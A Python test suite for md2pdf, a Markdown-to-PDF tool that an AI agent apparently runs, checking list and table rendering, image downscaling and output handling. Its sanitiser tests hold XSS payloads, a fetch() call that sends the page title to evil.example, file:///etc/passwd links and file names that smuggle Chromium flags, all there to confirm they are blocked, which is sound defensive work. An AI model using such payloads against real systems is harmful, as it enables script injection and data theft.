"""Tests of md2pdf. Run with `python3 containers/agent/md2pdf/test_md2pdf.py`.

They need Python's `markdown` and `PIL` (Pillow) packages and nothing else: a script
stands in for Chromium, except in the tests that print a real page, which are skipped
where no Chromium is installed. The image build runs them too, against the versions the
image has.
"""

import os
import re
import shutil
import subprocess
import sys
import tempfile
import unittest
from importlib.machinery import SourceFileLoader
from importlib.util import module_from_spec, spec_from_loader
from pathlib import Path
from unittest import mock
from urllib.parse import unquote, urlsplit

from PIL import Image

HERE = Path(__file__).resolve().parent
# Beside this file in the repository, on the path in the image.
SCRIPT = HERE / "md2pdf" if (HERE / "md2pdf").is_file() else Path(shutil.which("md2pdf"))

sys.dont_write_bytecode = True
_loader = SourceFileLoader("md2pdf", str(SCRIPT))
md2pdf = module_from_spec(spec_from_loader("md2pdf", _loader))
_loader.exec_module(md2pdf)

# Stands in for Chromium: notes what it was started with, keeps the page it was given
# and does what MODE says.
FAKE_CHROMIUM = """#!/bin/sh
printf '%s\\n' "$@" > "$FAKE/arguments"
echo $$ > "$FAKE/pid"
for argument in "$@"; do
  case $argument in
    file://*) cp "${argument#file://}" "$FAKE/page" ;;
    --print-to-pdf=*) pdf=${argument#--print-to-pdf=} ;;
    --no-sandbox) unconfined=1 ;;
  esac
done
case $MODE in
  needs-no-sandbox) [ -n "${unconfined:-}" ] || exit 133 ;;
  fails) echo "chromium is unwell" >&2; exit 1 ;;
  half) printf '%%PDF-half' > "$pdf"; exit 1 ;;
  hangs) sleep 600 & sleep 600 ;;
esac
printf '%%PDF-1.4 a page' > "$pdf"
"""


def body(text, folder=Path("/nonexistent"), scratch=Path("/nonexistent"), allowed=md2pdf.EACH):
    """The part of the page that a piece of Markdown becomes."""
    page = md2pdf.Page(md2pdf.picture_in(Path(folder), Path(scratch), allowed))
    page.feed(md2pdf.to_html(text))
    page.close()
    return "".join(page.out)


def squeezed(text):
    """HTML without the space between its tags, to compare structure."""
    return re.sub(r">\s+<", "><", text.strip())


class Lists(unittest.TestCase):
    def test_a_list_right_under_a_line_of_text_is_a_list(self):
        self.assertEqual(
            squeezed(body("Key points:\n- first\n- second\n")),
            "<p>Key points:</p><ul><li>first</li><li>second</li></ul>",
        )
        self.assertEqual(
            squeezed(body("**Steps**\n1. first\n2. second\n")),
            "<p><strong>Steps</strong></p><ol><li>first</li><li>second</li></ol>",
        )

    def test_text_that_begins_with_a_year_and_a_full_stop_stays_text(self):
        self.assertNotIn("<ol", body("It happened in\n2019. Then things changed.\n"))

    def test_a_list_keeps_the_number_it_starts_at(self):
        self.assertIn('<ol start="3">', body("3. three\n4. four\n"))

    def test_items_indented_by_two_or_three_spaces_are_nested(self):
        self.assertEqual(
            squeezed(body("- parent\n  - child\n    - grandchild\n- next\n")),
            "<ul><li>parent<ul><li>child<ul><li>grandchild</li></ul></li></ul></li>"
            "<li>next</li></ul>",
        )
        self.assertEqual(
            squeezed(body("1. parent\n   - child\n   - child two\n2. next\n")),
            "<ol><li>parent<ul><li>child</li><li>child two</li></ul></li><li>next</li></ol>",
        )

    def test_bullets_and_numbers_at_one_depth_are_two_lists(self):
        self.assertEqual(
            squeezed(body("- a\n- b\n1. one\n2. two\n")),
            "<ul><li>a</li><li>b</li></ul><ol><li>one</li><li>two</li></ol>",
        )

    def test_a_paragraph_indented_under_an_item_stays_in_it(self):
        self.assertEqual(
            squeezed(body("1. First\n\n   More about first.\n\n2. Second\n\nAfter.\n")),
            "<ol><li><p>First</p><p>More about first.</p></li><li><p>Second</p></li></ol>"
            "<p>After.</p>",
        )

    def test_a_table_in_an_item_is_a_table(self):
        html = squeezed(body("1. Results:\n   | a | b |\n   |---|---|\n   | 1 | 2 |\n2. Next\n"))
        self.assertIn("<li><p>Results:</p><table><thead><tr><th>a</th>", html)
        self.assertIn("</table></li><li><p>Next</p></li></ol>", html)

    def test_a_heading_ends_a_list(self):
        self.assertEqual(
            squeezed(body("- a\n- b\n## Heading\ntext\n")),
            "<ul><li>a</li><li>b</li></ul><h2>Heading</h2><p>text</p>",
        )

    def test_lines_indented_by_four_spaces_under_an_empty_one_are_code(self):
        self.assertIn("<pre><code>- name: x\n", body("Config:\n\n    - name: x\n      value: y\n"))


class CodeBlocks(unittest.TestCase):
    def test_a_code_block_in_a_list_is_code_and_the_numbering_goes_on(self):
        html = squeezed(body("1. Run:\n   ```bash\n   ls -la\n     echo hi\n   ```\n2. Done\n"))
        self.assertEqual(
            html,
            "<ol><li>Run:</li></ol><pre><code>ls -la\n  echo hi\n</code></pre>"
            '<ol start="2"><li>Done</li></ol>',
        )

    def test_what_follows_the_language_of_a_code_block_is_left_out(self):
        self.assertIn("<pre><code>print(1)\n", body('```python title="x.py"\nprint(1)\n```\n'))

    def test_a_code_block_that_is_never_closed_is_code_to_the_end(self):
        self.assertEqual(
            squeezed(body("Run this:\n```\nls <b>\n")),
            "<p>Run this:</p><pre><code>ls &lt;b&gt;\n</code></pre>",
        )

    def test_nothing_in_a_code_block_is_rewritten(self):
        self.assertIn(
            "<pre><code>&lt;div&gt;\n- a\n  - b\n| x |\n&lt;/div&gt;\n</code></pre>",
            body("```\n<div>\n- a\n  - b\n| x |\n</div>\n```\n"),
        )


class Tables(unittest.TestCase):
    def test_a_table_right_under_a_line_of_text_is_a_table(self):
        html = squeezed(body("Totals:\n| a | b |\n|---|---|\n| 1 | 2 |\n"))
        self.assertTrue(html.startswith("<p>Totals:</p><table><thead>"), html)

    def test_rows_without_a_header_are_a_table_without_one(self):
        self.assertEqual(
            squeezed(body("| Total | 100 |\n| Tax | 7 |\n")),
            "<table><tbody><tr><td>Total</td><td>100</td></tr>"
            "<tr><td>Tax</td><td>7</td></tr></tbody></table>",
        )

    def test_columns_that_are_empty_in_every_row_are_left_out(self):
        self.assertEqual(
            squeezed(body("|  | Total | 100 |  |\n|  | Tax |  |  |\n")),
            "<table><tbody><tr><td>Total</td><td>100</td></tr>"
            "<tr><td>Tax</td><td></td></tr></tbody></table>",
        )

    def test_a_pipe_in_code_or_behind_a_backslash_does_not_end_a_cell(self):
        self.assertEqual(
            squeezed(body("| `a|b` | c \\| d |\n")),
            "<table><tbody><tr><td><code>a|b</code></td><td>c | d</td></tr></tbody></table>",
        )

    def test_a_table_whose_dividing_line_is_too_short_is_still_a_table(self):
        self.assertEqual(
            squeezed(body("| a | b | c |\n|---|---|\n| 1 | 2 | 3 |\n")),
            "<table><thead><tr><th>a</th><th>b</th><th>c</th></tr></thead>"
            "<tbody><tr><td>1</td><td>2</td><td>3</td></tr></tbody></table>",
        )

    def test_the_alignment_of_a_column_is_kept(self):
        html = body("| a | b |\n|:--|--:|\n| 1 | 2 |\n")
        self.assertIn('<th style="text-align:left">a</th>', html)
        self.assertIn('<td style="text-align:right">2</td>', html)

    def test_br_is_a_line_break_in_a_cell(self):
        self.assertIn("<td>one<br>two</td>", body("| a | b |\n|---|---|\n| one<br>two | x |\n"))


class Text(unittest.TestCase):
    def test_a_line_break_in_the_markdown_is_one_in_the_pdf(self):
        self.assertEqual(squeezed(body("Jo Doe\n1 Main St\n")), "<p>Jo Doe<br>\n1 Main St</p>")

    def test_bold_ends_at_chinese_punctuation(self):
        self.assertEqual(
            body("**标题：**内容和 **粗体**文字\n"),
            "<p><strong>标题：</strong>内容和 <strong>粗体</strong>文字</p>",
        )

    def test_struck_text_is_struck(self):
        self.assertEqual(body("~~old~~ new\n"), "<p><del>old</del> new</p>")

    def test_an_address_in_the_text_is_a_link(self):
        self.assertEqual(
            body("See https://example.com/a_b?c=1&d=2.\n"),
            '<p>See <a href="https://example.com/a_b?c=1&amp;d=2">'
            "https://example.com/a_b?c=1&amp;d=2</a>.</p>",
        )
        self.assertEqual(
            body("(https://en.wikipedia.org/wiki/A_(b))\n"),
            '<p>(<a href="https://en.wikipedia.org/wiki/A_(b)">'
            "https://en.wikipedia.org/wiki/A_(b)</a>)</p>",
        )

    def test_an_address_ends_where_chinese_begins(self):
        self.assertEqual(
            body("详见https://example.com/x。然后\n"),
            '<p>详见<a href="https://example.com/x">https://example.com/x</a>。然后</p>',
        )

    def test_a_link_written_as_one_is_not_linked_twice(self):
        self.assertEqual(
            body("[https://a.example](https://a.example) <https://b.example>\n"),
            '<p><a href="https://a.example">https://a.example</a> '
            '<a href="https://b.example">https://b.example</a></p>',
        )

    def test_the_text_of_a_footnote_is_kept(self):
        html = body("Text[^1] more.\n\n[^1]: The note.\n")
        self.assertIn("Text<sup>1</sup> more.", html)
        self.assertIn("The note.", html)


class Html(unittest.TestCase):
    def test_text_in_angle_brackets_is_printed(self):
        self.assertEqual(
            body("Dear <customer name>, hello\n"), "<p>Dear &lt;customer name&gt;, hello</p>"
        )

    def test_plain_formatting_written_as_html_is_kept(self):
        self.assertEqual(
            body("H<sub>2</sub>O is <b>wet</b>\n"), "<p>H<sub>2</sub>O is <b>wet</b></p>"
        )

    def test_markdown_wrapped_in_html_is_still_markdown(self):
        html = squeezed(
            body(
                '<div align="center">\n\n**bold**\n- item\n\n</div>\n\n'
                "<details>\n<summary>More</summary>\n\nHidden *text*.\n\n</details>\n"
            )
        )
        self.assertEqual(
            html,
            "<p><strong>bold</strong></p><ul><li>item</li></ul><div>More</div>"
            "<p>Hidden <em>text</em>.</p>",
        )

    def test_a_script_is_so_much_text(self):
        html = body("Hi <script>fetch('https://evil.example/' + document.title)</script>\n")
        self.assertNotIn("<script", html)
        self.assertIn("&lt;script&gt;fetch(", html)

    def test_a_script_that_is_never_closed_does_not_swallow_the_rest(self):
        html = squeezed(body("The <script> tag and the <style> tag.\n\n## Next\n\n- item\n"))
        self.assertTrue(html.endswith("<h2>Next</h2><ul><li>item</li></ul>"), html)

    def test_nothing_a_tag_came_with_reaches_the_page(self):
        html = body(
            '<p onclick="x()" style="background: url(https://evil.example/a)">text</p>\n\n'
            '<table><tr><td colspan="2" rowspan="x" style="text-align: center; color: '
            'red" onmouseover="x()">cell</td></tr></table>\n'
        )
        self.assertEqual(
            squeezed(html),
            '<p>text</p><table><tr><td style="text-align:center" colspan="2">cell</td></tr></table>',
        )

    def test_a_link_leads_to_a_page_or_a_mailbox_or_nowhere(self):
        self.assertEqual(
            body(
                "[a](javascript:alert(1)) [b](data:text/html,x) [c](file:///etc/passwd) "
                "[d](#top) [e](mailto:a@b.example) [f](HTTPS://b.example)\n"
            ),
            '<p>a b c d <a href="mailto:a@b.example">e</a> <a href="HTTPS://b.example">f</a></p>',
        )

    def test_only_tags_from_the_list_are_ever_written(self):
        hostile = [
            "<iframe src=file:///etc/passwd></iframe><object data=x></object><embed src=x>",
            '<link rel="stylesheet" href="https://evil.example/a.css"><base href="https://evil.example/">',
            '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
            "<svg onload=alert(1)><image href=https://evil.example/a /></svg><math><mi>x</mi></math>",
            "<style>@import url(https://evil.example/a.css);</style>",
            "<form action=https://evil.example><input name=a><button>go</button></form>",
            "<video src=https://evil.example/v autoplay></video><audio src=x></audio>",
            "<a href='https://ok.example' ping='https://evil.example'>x</a>",
            "<ScRiPt>alert(1)</sCrIpT> <scr<script>ipt>alert(1)</scr</script>ipt>",
            "<div><script>alert(1)</script>\n\n</div>",
            "<p <script>alert(1)</script>>",
            "<<script>script>alert(1)<</script>/script>",
            "<b onmouseover=alert(1)>x</b>",
            "<!--><script>alert(1)</script>-->",
            "<title><script>alert(1)</script></title><textarea><script>alert(1)</script></textarea>",
            "<plaintext><script>alert(1)</script>",
            "```\n</code></pre><script>alert(1)</script>\n```",
            "| a |\n|---|\n| <script>alert(1)</script> |",
            "[x](https://ok.example\" onclick=\"alert(1))",
            "![x\" onerror=\"alert(1)](nothing.png)",
            "&lt;script&gt;alert(1)&lt;/script&gt; &#60;script&#62;",
        ]
        allowed = md2pdf.KEPT | {"div"}
        for text in hostile + ["\n\n".join(hostile)]:
            try:
                html = body(text)
            except md2pdf.Problem:
                continue
            for closing, tag, rest in re.findall(r"<(/?)([^\s<>/]*)([^<>]*)>", html):
                self.assertIn(tag, allowed, f"{text!r} became {html!r}")
                for name in re.findall(r'\s([^\s="]+)="[^"]*"', rest):
                    self.assertIn(name, ("href", "style", "start", "colspan", "rowspan"), html)
                self.assertFalse(re.sub(r'\s[^\s="]+="[^"]*"', "", rest), html)
            self.assertNotRegex(html, r"<(?![a-z/])", f"{text!r} became {html!r}")


class Pictures(unittest.TestCase):
    def setUp(self):
        self.folder = Path(self.enterContext(tempfile.TemporaryDirectory()))
        (self.folder / "a chart.png").write_bytes(b"\x89PNG")
        self.address = (self.folder / "a chart.png").resolve().as_uri()

    def test_a_picture_is_the_file_beside_the_markdown(self):
        for name in ("a%20chart.png", "<a chart.png>", "./a%20chart.png", self.address):
            self.assertEqual(
                body(f"![Sales]({name})\n", self.folder),
                f'<p><img src="{self.address}" alt="Sales"></p>',
            )

    def test_a_picture_written_as_html_is_treated_the_same(self):
        self.assertEqual(
            body('<img src="a chart.png" width="300" onerror="x()">\n', self.folder),
            f'<p><img src="{self.address}"></p>',
        )
        with self.assertRaises(md2pdf.Problem):
            body('<div><img src="https://evil.example/a.png"></div>\n', self.folder)

    def test_a_picture_on_the_web_is_refused(self):
        for address in (
            "https://evil.example/a.png?secret",
            "http://127.0.0.1:8080/a.png",
            "//evil.example/a.png",
            "data:image/png;base64,iVBORw0KGgo=",
            "ftp://evil.example/a.png",
        ):
            with self.assertRaisesRegex(md2pdf.Problem, "has to be a file", msg=address):
                body(f"![x]({address})\n", self.folder)

    def test_a_picture_that_is_not_there_is_an_error(self):
        for name in ("missing.png", ".", "/dev/zero", "http://[::1"):
            with self.assertRaisesRegex(md2pdf.Problem, "no picture at", msg=name):
                body(f"![x]({name})\n", self.folder)


def loaded(page):
    """The files a page makes Chromium load as pictures."""
    addresses = re.findall(r'<img src="([^"]+)"', page)
    return [Path(unquote(urlsplit(address).path)) for address in addresses]


class LargePictures(unittest.TestCase):
    """Chromium keeps a picture in memory at its full size, and the container is small."""

    def setUp(self):
        self.folder = Path(self.enterContext(tempfile.TemporaryDirectory()))
        self.scratch = self.folder / "scratch"
        self.scratch.mkdir()

    def halves(self, mode, left, right):
        """A picture of 400 by 200 pixels, 80,000 in all, in two colours."""
        picture = Image.new(mode, (400, 200), left)
        picture.paste(right, (200, 0, 400, 200))
        return picture

    def shown(self, text, allowed=20_000):
        return loaded(body(text, self.folder, self.scratch, allowed))

    def test_a_picture_of_too_many_pixels_is_loaded_from_a_smaller_copy(self):
        self.halves("RGB", "red", "blue").save(self.folder / "photo.jpg")
        original = (self.folder / "photo.jpg").read_bytes()
        first, second = self.shown("![a](photo.jpg)\n\n![again](photo.jpg)\n")
        self.assertEqual(first, second)
        self.assertEqual(list(self.scratch.iterdir()), [first])
        with Image.open(first) as copy:
            self.assertEqual((copy.format, copy.size), ("JPEG", (200, 100)))
            red, _, blue = copy.getpixel((50, 50))
            self.assertTrue(red > 200 and blue < 60, copy.getpixel((50, 50)))
        self.assertEqual((self.folder / "photo.jpg").read_bytes(), original)

    def test_a_picture_that_is_small_enough_is_loaded_as_it_is(self):
        self.halves("RGB", "red", "blue").save(self.folder / "photo.jpg")
        (self.folder / "chart.svg").write_text(
            '<svg xmlns="http://www.w3.org/2000/svg" width="9000" height="9000"/>'
        )
        (self.folder / "damaged.png").write_bytes(b"\x89PNG\r\n\x1a\n" + bytes(64))
        here = self.folder.resolve()
        self.assertEqual(self.shown("![a](photo.jpg)\n", allowed=80_000), [here / "photo.jpg"])
        # A drawing has no pixels, and of a damaged file Chromium shows what it can.
        self.assertEqual(
            self.shown("![b](chart.svg) ![c](damaged.png)\n", allowed=1),
            [here / "chart.svg", here / "damaged.png"],
        )
        self.assertEqual(list(self.scratch.iterdir()), [])

    def test_what_can_be_seen_through_stays_so_in_the_copy(self):
        self.halves("RGBA", (0, 0, 0, 0), (0, 0, 255, 255)).save(self.folder / "layer.png")
        palette = self.halves("P", 0, 1)
        palette.putpalette([255, 255, 255, 0, 0, 255])
        palette.save(self.folder / "palette.png", transparency=0)
        key = self.halves("RGB", (255, 0, 255), (0, 0, 255))
        key.save(self.folder / "key.png", transparency=(255, 0, 255))
        for name in ("layer.png", "palette.png", "key.png"):
            (copy,) = self.shown(f"![a]({name})\n")
            with Image.open(copy) as copy:
                self.assertEqual((copy.format, copy.mode, copy.size), ("PNG", "RGBA", (200, 100)), name)
                self.assertEqual(copy.getpixel((50, 50))[3], 0, name)
                self.assertEqual(copy.getpixel((150, 50)), (0, 0, 255, 255), name)

    def test_every_kind_of_picture_chromium_is_given_can_be_made_smaller(self):
        for name in ("sticker.webp", "moving.gif", "screen.png", "old.bmp"):
            self.halves("RGB", "red", "blue").save(self.folder / name)
            (copy,) = self.shown(f"![a]({name})\n")
            with Image.open(copy) as copy:
                self.assertEqual((copy.format, copy.size), ("PNG", (200, 100)), name)
                red, _, blue = copy.convert("RGB").getpixel((50, 50))
                self.assertTrue(red > 200 and blue < 60, name)
        # A JPEG in four inks, as a print shop sends it, comes out in three.
        self.halves("CMYK", (0, 255, 255, 0), (255, 255, 0, 0)).save(self.folder / "print.jpg")
        (copy,) = self.shown("![a](print.jpg)\n")
        with Image.open(copy) as copy:
            self.assertEqual((copy.format, copy.mode, copy.size), ("JPEG", "RGB", (200, 100)))

    def test_a_photograph_taken_with_the_camera_upright_stays_upright(self):
        # What a phone writes: the picture lying on its side, and a note to turn it.
        note = Image.Exif()
        note[0x0112] = 6
        self.halves("RGB", "red", "blue").save(self.folder / "photo.jpg", exif=note)
        (copy,) = self.shown("![a](photo.jpg)\n")
        with Image.open(copy) as copy:
            self.assertEqual(copy.size, (100, 200))
            self.assertNotIn(0x0112, copy.getexif())
            top, bottom = copy.getpixel((50, 40)), copy.getpixel((50, 160))
            self.assertTrue(top[0] > 200 and top[2] < 60, top)
            self.assertTrue(bottom[2] > 200 and bottom[0] < 60, bottom)

    def test_the_pictures_of_a_document_share_what_it_may_have(self):
        self.halves("RGB", "red", "blue").save(self.folder / "one.png")
        limits = {"EACH": 100_000, "IN_ALL": 240_000}
        with mock.patch.multiple(md2pdf, **limits):
            alone = md2pdf.page("![a](one.png)\n", "t", self.folder, "", self.scratch)
            self.assertEqual(loaded(alone), [(self.folder / "one.png").resolve()])
            # Four of them, one written as HTML: 60,000 pixels for each.
            text = '![a](one.png) ![b](one.png)\n\n![c](one.png) <IMG src="one.png">\n'
            four = md2pdf.page(text, "t", self.folder, "", self.scratch)
        copies = set(loaded(four))
        self.assertEqual(len(loaded(four)), 4)
        self.assertEqual(copies, {self.scratch / "picture-1.png"})
        with Image.open(copies.pop()) as copy:
            self.assertEqual(copy.size, (346, 173))

    def test_a_picture_too_large_to_be_made_smaller_is_refused(self):
        self.halves("RGB", "red", "blue").save(self.folder / "scan.png")
        self.halves("RGB", "red", "blue").save(self.folder / "photo.jpg")
        with mock.patch.object(md2pdf, "LARGEST", 5_000):
            with self.assertRaisesRegex(
                md2pdf.Problem, r"scan\.png is too large to put into a PDF, at 400 by 200 pixels"
            ):
                self.shown("![a](scan.png)\n", allowed=1250)
            # A JPEG is never unpacked whole: at an eighth, this one is 50 by 25.
            (copy,) = self.shown("![a](photo.jpg)\n", allowed=1250)
        with Image.open(copy) as copy:
            self.assertEqual(copy.size, (50, 25))


class ThePage(unittest.TestCase):
    def test_the_page_allows_local_pictures_and_its_own_styles_and_nothing_else(self):
        nowhere = Path("/nonexistent")
        page = md2pdf.page("# Title\n", "a <report>", nowhere, "h1 { color: red }", nowhere)
        self.assertIn(
            '<meta http-equiv="Content-Security-Policy" content="default-src \'none\'; '
            "img-src file:; style-src 'unsafe-inline'\">",
            page,
        )
        self.assertLess(page.index("Content-Security-Policy"), page.index("<style>"))
        self.assertIn("<title>a &lt;report&gt;</title>", page)
        self.assertIn("<h1>Title</h1>", page)


class TheCommand(unittest.TestCase):
    """The script as the agent runs it, with a stand-in for Chromium."""

    def setUp(self):
        self.work = Path(self.enterContext(tempfile.TemporaryDirectory()))
        self.out = self.work / "out"
        fake = self.work / "bin" / "chromium-headless-shell"
        fake.parent.mkdir()
        fake.write_text(FAKE_CHROMIUM)
        fake.chmod(0o755)
        self.environment = dict(
            os.environ,
            PATH=f"{fake.parent}{os.pathsep}{os.environ['PATH']}",
            FAKE=str(fake.parent),
            MODE="works",
            MD2PDF_HOME=str(HERE),
            MD2PDF_OUT_DIR=str(self.out),
        )
        (self.work / "report.md").write_text("# Report\n\n报告\n", encoding="utf-8")

    def run_md2pdf(self, *arguments, mode="works"):
        return subprocess.run(
            [sys.executable, str(SCRIPT), *arguments],
            cwd=self.work,
            env=dict(self.environment, MODE=mode),
            capture_output=True,
            text=True,
        )

    def arguments(self):
        return (self.work / "bin" / "arguments").read_text().splitlines()

    def test_the_pdf_goes_to_the_output_directory_and_the_agent_is_told(self):
        done = self.run_md2pdf("report.md")
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertEqual((self.out / "report.pdf").read_bytes(), b"%PDF-1.4 a page")
        self.assertRegex(
            done.stdout,
            r"^wrote \S+/out/report\.pdf.*; the user receives it when you finish, "
            r"so there is nothing to move or copy\n$",
        )
        self.assertEqual([entry.name for entry in self.work.iterdir() if entry.is_file()], ["report.md"])

    def test_of_an_output_name_with_a_directory_only_the_name_is_used(self):
        done = self.run_md2pdf("report.md", "../../etc/summary.pdf")
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertEqual([entry.name for entry in self.out.iterdir()], ["summary.pdf"])
        for name in ("..", "sub/", "."):
            self.assertEqual(self.run_md2pdf("report.md", name).returncode, 1, name)

    def test_chromium_is_told_nothing_the_agent_wrote(self):
        (self.work / "--no-sandbox --remote-debugging-port=9222.md").write_text("text\n")
        done = self.run_md2pdf("--no-sandbox --remote-debugging-port=9222.md", "--proxy-server=x.pdf")
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertTrue((self.out / "--proxy-server=x.pdf").is_file())
        *options, page = self.arguments()
        self.assertRegex(page, r"^file:///.*/md2pdf-[^/]+/document\.html$")
        for option in options:
            self.assertTrue(option.startswith("--"), option)
            self.assertNotIn("9222", option)
            self.assertNotIn("proxy", option)
        self.assertNotIn("--no-sandbox", options)

    def test_chromium_is_started_again_without_its_sandbox_where_it_has_none(self):
        done = self.run_md2pdf("report.md", mode="needs-no-sandbox")
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertTrue((self.out / "report.pdf").is_file())
        self.assertIn("--no-sandbox", self.arguments())

    def test_a_print_that_fails_leaves_the_output_directory_as_it_was(self):
        self.out.mkdir()
        (self.out / "report.pdf").write_bytes(b"%PDF the one from before")
        for mode in ("fails", "half"):
            done = self.run_md2pdf("report.md", mode=mode)
            self.assertEqual(done.returncode, 1, mode)
            self.assertIn("Tell the user that the PDF could not be made", done.stderr)
            self.assertEqual(done.stdout, "")
            self.assertEqual([entry.name for entry in self.out.iterdir()], ["report.pdf"])
            self.assertEqual((self.out / "report.pdf").read_bytes(), b"%PDF the one from before")

    def test_a_picture_that_cannot_be_used_stops_it_before_chromium_starts(self):
        (self.work / "report.md").write_text("![x](https://evil.example/a.png)\n")
        done = self.run_md2pdf("report.md")
        self.assertEqual(done.returncode, 1)
        self.assertIn("md2pdf: a picture has to be a file", done.stderr)
        self.assertFalse((self.work / "bin" / "arguments").exists())
        self.assertFalse(self.out.exists())

    def test_a_large_picture_is_printed_from_a_copy_that_is_not_kept(self):
        Image.new("RGB", (2400, 1600), "red").save(self.work / "photo.jpg")
        original = (self.work / "photo.jpg").read_bytes()
        (self.work / "report.md").write_text("![photo](photo.jpg)\n")
        done = self.run_md2pdf("report.md")
        self.assertEqual(done.returncode, 0, done.stderr)
        (copy,) = loaded((self.work / "bin" / "page").read_text())
        self.assertRegex(str(copy), r"/md2pdf-[^/]+/picture-1\.jpg$")
        self.assertFalse(copy.parent.exists())
        self.assertEqual((self.work / "photo.jpg").read_bytes(), original)
        files = sorted(entry.name for entry in self.work.iterdir() if entry.is_file())
        self.assertEqual(files, ["photo.jpg", "report.md"])

    def test_what_is_not_one_or_two_arguments_is_answered_with_the_usage(self):
        for arguments in ((), ("report.md", "a.pdf", "b.pdf")):
            done = self.run_md2pdf(*arguments)
            self.assertEqual(done.returncode, 2)
            self.assertIn("usage: md2pdf INPUT.md [OUTPUT.pdf]", done.stderr)
        done = self.run_md2pdf("missing.md")
        self.assertEqual(done.returncode, 1)
        self.assertIn("md2pdf: no such file: missing.md", done.stderr)

    def test_a_chromium_that_never_finishes_is_ended_with_all_it_started(self):
        with mock.patch.dict(os.environ, dict(self.environment, MODE="hangs")), mock.patch.object(
            md2pdf, "PRINT_TIMEOUT", 0.5
        ):
            with self.assertRaisesRegex(md2pdf.Problem, "could not make the PDF"):
                md2pdf.print_pdf(self.work / "document.html", self.work / "document.pdf", self.work)
        # It was tried without the sandbox as well, and nothing of either try is left.
        self.assertIn("--no-sandbox", self.arguments())
        group = int((self.work / "bin" / "pid").read_text())
        with self.assertRaises(ProcessLookupError):
            os.killpg(group, 0)

    @unittest.skipUnless(
        any(shutil.which(name) for name in md2pdf.BROWSERS) and shutil.which("pdftotext"),
        "needs Chromium and pdftotext",
    )
    def test_chromium_prints_the_text_and_counts_the_pages(self):
        (self.work / "dot.svg").write_text(
            '<svg xmlns="http://www.w3.org/2000/svg" width="900" height="1600"/>'
        )
        (self.work / "report.md").write_text(
            "# Check\n\n| a | b |\n|---|---|\n| 中文 | ok |\n\n![dot](dot.svg)\n", encoding="utf-8"
        )
        environment = dict(self.environment, PATH=os.environ["PATH"])
        done = subprocess.run(
            [sys.executable, str(SCRIPT), "report.md"],
            cwd=self.work,
            env=environment,
            capture_output=True,
            text=True,
        )
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertIn("report.pdf (1 page);", done.stdout)
        text = subprocess.run(
            ["pdftotext", str(self.out / "report.pdf"), "-"], capture_output=True, text=True
        ).stdout
        self.assertIn("中文", text)
        # The page number, from the style sheet.
        self.assertRegex(text, r"(?m)^1$")

    @unittest.skipUnless(
        any(shutil.which(name) for name in md2pdf.BROWSERS) and shutil.which("pdfimages"),
        "needs Chromium and pdfimages",
    )
    def test_chromium_prints_a_large_picture_at_the_size_of_its_copy(self):
        Image.new("RGB", (3000, 2000), "red").save(self.work / "scan.png")
        (self.work / "report.md").write_text("# Scan\n\n![scan](scan.png)\n")
        done = subprocess.run(
            [sys.executable, str(SCRIPT), "report.md"],
            cwd=self.work,
            env=dict(self.environment, PATH=os.environ["PATH"]),
            capture_output=True,
            text=True,
        )
        self.assertEqual(done.returncode, 0, done.stderr)
        listed = subprocess.run(
            ["pdfimages", "-list", str(self.out / "report.pdf")], capture_output=True, text=True
        ).stdout
        sizes = [tuple(map(int, row.split()[3:5])) for row in listed.splitlines()[2:]]
        self.assertEqual(sizes, [(1732, 1154)], listed)


if __name__ == "__main__":
    unittest.main()
